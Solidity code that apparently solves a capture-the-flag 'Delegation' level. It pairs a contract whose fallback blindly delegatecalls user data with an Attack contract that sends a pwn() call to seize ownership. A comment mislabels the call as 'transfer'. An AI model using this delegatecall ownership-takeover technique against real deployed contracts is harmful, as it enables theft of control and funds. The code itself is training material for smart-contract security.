pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

//调用transfer函数，data为0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab
contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

contract Attack {

    function getCode() external pure returns(bytes memory){
        return abi.encodeWithSignature("pwn()");
    }

    function attack(address delegate) external payable returns(bool) {
        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool success,) = delegate.call{ value: msg.value }(data);
        return success;
    }
}